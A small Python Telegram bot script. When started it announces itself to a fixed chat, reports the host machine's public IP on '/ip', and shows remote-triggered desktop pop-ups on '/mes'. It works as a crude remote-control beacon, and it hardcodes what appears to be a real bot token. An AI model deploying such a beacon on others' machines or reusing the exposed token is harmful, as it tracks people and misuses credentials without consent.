import telebot
import random
import requests
import pyautogui 
import platform as pf
from telebot import types

my_list2 = ["Привет","Приветики","Здорова","Здравки","Здравствуйте","Bonjour","Hola","*выжидающе молчит*","*кивает*","Guten Tag"]


TOKEN = '1691047788:AAH5xqPGG7gmaQpMYTVSXmRV1B5F4UzpO54'
CHAT_ID = 368720613
bot = telebot.TeleBot(TOKEN)
requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=Online")
@bot.message_handler(content_types=['text'])

def lalala(message):
    if message.text == "Привет":        	
        xi= (random.randint(0,9))
        hi = my_list2[int(xi)]
        bot.send_message(message.from_user.id, hi)
    

    elif message.text == '/ip':
        bot.register_next_step_handler(message, ip_address);        
    elif message.text == '/mes':
        bot.register_next_step_handler(message, mes);       
def ip_address(message):
    response = requests.get("http://jsonip.com/").json()
    bot.send_message(message.chat.id, f"IP Address: {response['ip']}")
def mes(message): 
    global aoe;
    aoe = message.text;
    pyautogui.alert (text = aoe, title = '????', button = 'ОК') 
bot.polling(none_stop=True)       
